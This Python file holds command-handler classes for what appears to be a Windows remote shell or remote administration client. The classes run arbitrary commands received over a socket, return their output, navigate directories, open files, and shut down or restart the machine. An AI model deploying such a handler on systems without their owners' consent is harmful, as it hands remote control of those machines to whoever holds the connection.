from os import chdir, popen, getcwd
import subprocess
class Cd:
    def __init__(self, command: str):
        self.clean_command = command.lower().replace(" ", "")
        if self.clean_command == "cd..":
            try:
                chdir("..")
            except:
                pass
        elif command[:3] == "cd " and self.clean_command[-1] != ":":
            try:
                chdir("{}\\{}\\".format(getcwd(), command[3:]))
            except:
                pass
        elif command[0:3] == "cd " and self.clean_command[-1] == ":":
            try:
                chdir("{}:\\".format(self.clean_command[2].upper()))
            except:
                pass
        elif int(len(self.clean_command)) == 2 and self.clean_command[-1] == ":":
            try:
                chdir("{}:\\".format(self.clean_command[0].upper()))
            except:
                pass

class PWD:
    def __init__(self, conn): 
        self.send(conn, str(getcwd()))

    def send(self, conn, msg: str):
        conn.send(msg.encode())

class Explorer:
    def __init__(self, command: str):
        self.clean_command = command.lower().replace(" ", "")
        if self.clean_command == "explorer":
            popen("explorer")  
        elif self.clean_command == "explorer.":
            popen("explorer .")
            
class Popen:
    def __init__(self, conn, command: str):
        execute = subprocess.Popen("{}".format(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        popen = execute.stdout.read() + execute.stderr.read()
        conn.send(popen)           
    
    def send(self, conn, msg: str):
        conn.send(msg.encode())

class Open:
    def __init__(self, file: str):
        formatted_file = file.replace(" ", "")
        if formatted_file[:5] == "start":
            self.run = popen("start \"{}\"".format(file[6:]))
        elif formatted_file[:4] == "call":
            self.run = popen("call \"{}\"".format(file[5:]))
        elif formatted_file[:4] == "open":
            self.run = popen("\"{}\"".format(file[5:]))

class Put:
    def __init__(self, command: str):
        popen(command)

class Power:
    def __init__(self, command: str):
        self.clean_command = command.lower().replace(" ", "")
        if self.clean_command[:8] == "shutdown":
            popen("shutdown /s /t 0")
        elif self.clean_command[:7] == "restart":
            popen("shutdown /r /t 0")
        elif self.clean_command[:6] == "reboot":
            popen("shutdown /r /t 0")
        elif self.clean_command[:6] == "logout":
            popen("shutdown /l /t 0")
